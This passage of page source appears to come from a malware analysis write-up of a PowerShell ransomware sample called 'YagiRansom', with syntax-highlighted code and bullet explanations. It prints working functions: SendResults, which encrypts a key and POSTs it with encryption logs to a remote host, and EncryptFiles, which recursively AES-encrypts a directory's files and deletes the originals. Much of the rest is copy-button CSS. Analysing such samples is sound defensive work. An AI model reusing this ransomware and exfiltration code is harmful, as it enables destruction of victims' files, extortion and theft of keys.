1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>Takes \u003Ccode>$args\u003C/code> as input\n\u003Cul>\n\u003Cli>If \u003Ccode>$args[0]\u003C/code> is “-t”, converts the text in \u003Ccode>$args[1]\u003C/code> to bytes using UTF-8, then encodes it using base64 and stores it in \u003Ccode>$VaFQ\u003C/code>\u003C/li>\n\u003Cli>If \u003Ccode>$args[0]\u003C/code> is “-f”, reads the file in \u003Ccode>$args[1]\u003C/code>, converts it to bytes, then encodes it using base64 and stores it in \u003Ccode>$VaFQ\u003C/code>\u003C/li>\n\u003Cli>Removes the padding character ”=” from base64 and replaces “C” with ”-” as well as “E” with ”_”\u003C/li>\n\u003Cli>Converts \u003Ccode>$VaFQ\u003C/code> to a character array stored in \u003Ccode>$8bKW\u003C/code>, reverses the array, then joins all characters to create and return \u003Ccode>$R64Base\u003C/code>\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"sendresults\">\u003Ch4 id=\"sendresults\">SendResults\u003C/h4>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> SendResults\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $cvf \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Invoke-AESEncryption\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Key $Uz19o \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Text $WiETm ; $cVl \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t $cvf\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $2YngY \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"> \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$cVl\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OgE\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$zVSza\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RansomLogs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Content\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Select-String\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!]\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Select-String\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"YagiRansom!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -NotMatch\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $XoX \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t $2YngY ; $B64Logs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> R64Encoder \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">t $RansomLogs\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Invoke-WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">useb \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/data\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Method POST \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Body $XoX \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">2>&#x26;1>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Invoke-WebRequest\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">useb \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/logs\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Method POST \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Body $B64Logs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">2>&#x26;1>\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"function SendResults {\n   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf\n   $2YngY = &#x22;> $cVl > $OgE > $zVSza > $7VEq&#x22;\n   $RansomLogs = Get-Content &#x22;$Directory$slash$I26&#x22; | Select-String &#x22;[!]&#x22; | Select-String &#x22;YagiRansom!&#x22; -NotMatch\n   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/data&#x22; -Method POST -Body $XoX 2>&#x26;1> $null\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/logs&#x22; -Method POST -Body $B64Logs 2>&#x26;1> $null }\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>Use \u003Ccode>AES\u003C/code> on \u003Ccode>$WiETm\u003C/code> with the key stored in \u003Ccode>$Uz19o\u003C/code> thenstored it in \u003Ccode>$cvf\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>$cvf\u003C/code> then get encoded by \u003Ccode>R64Encoder\u003C/code> and stored in \u003Ccode>$cVl\u003C/code>\u003C/li>\n\u003Cli>Stored \u003Ccode>$cVl\u003C/code>, \u003Ccode>$OgE\u003C/code>, \u003Ccode>$zVSza\u003C/code> and \u003Ccode>$7VEq\u003C/code> in \u003Ccode>$2YngY\u003C/code> respectively.\u003C/li>\n\u003Cli>Filter all strings, line that have \u003Ccode>!\u003C/code> in \u003Ccode>$Directory$slash$I26\u003C/code>, excluding all strings have \u003Ccode>YagiRansom!\u003C/code> and logs it to \u003Ccode>$RansomLogs\u003C/code>\u003C/li>\n\u003Cli>Encode \u003Ccode>$2YngY\u003C/code> with base64 and stores it in \u003Ccode>$XoX\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>$RansomLogs\u003C/code> also got encrypted with base64 and stored in \u003Ccode>$B64Logs\u003C/code>\u003C/li>\n\u003Cli>Send the \u003Ccode>$XoX\u003C/code> to endpoint \u003Ccode>$7CiB:$UFX/data\u003C/code> and \u003Ccode>$B64Logs\u003C/code> to endpoint \u003Ccode>$7CiB:$UFX/logs\u003C/code>\u003C/li>\n\u003C/ul>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"encryptfiles\">\u003Ch4 id=\"encryptfiles\">EncryptFiles\u003C/h4>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> EncryptFiles\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $ExcludedFiles \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.enc'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 'yaginote.txt'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.dll'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.ini'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.sys'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.exe'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.msi'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.NLS'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.acm'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.nls'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.EXE'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.dat'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.efi'\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> '*.mui'\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   foreach\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($i \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">in\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> $\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Get-ChildItem\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $Directory \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">recurse \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">exclude $ExcludedFiles \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Where-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.PSIsContainer } \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> ForEach-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.FullName })) { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Invoke-AESEncryption\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Key $WiETm \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Path $i ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Add-Content\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Path \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Value \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"[!] \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> is now encrypted\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Remove-Item\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $i }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RansomLogs \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Content\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Select-String\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!]\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Select-String\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"YagiRansom!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -NotMatch\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$RansomLogs) { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">   Add-Content\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Path \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Value \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"[!] No files have been encrypted!\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }}\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"function EncryptFiles { \n   $ExcludedFiles = &#x27;*.enc&#x27;, &#x27;yaginote.txt&#x27;, &#x27;*.dll&#x27;, &#x27;*.ini&#x27;, &#x27;*.sys&#x27;, &#x27;*.exe&#x27;, &#x27;*.msi&#x27;, &#x27;*.NLS&#x27;, &#x27;*.acm&#x27;, &#x27;*.nls&#x27;, &#x27;*.EXE&#x27;, &#x27;*.dat&#x27;, &#x27;*.efi&#x27;, &#x27;*.mui&#x27;\n   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { \n   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path &#x22;$Directory$slash$I26&#x22; -Value &#x22;[!] $i is now encrypted&#x22; ;\n   Remove-Item $i }\n   $RansomLogs = Get-Content &#x22;$Directory$slash$I26&#x22; | Select-String &#x22;[!]&#x22; | Select-String &#x22;YagiRansom!&#x22; -NotMatch ; if (!$RansomLogs) { \n   Add-Content -Path &#x22;$Directory$slash$I26&#x22; -Value &#x22;[!] No files have been encrypted!&#x22; }}\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 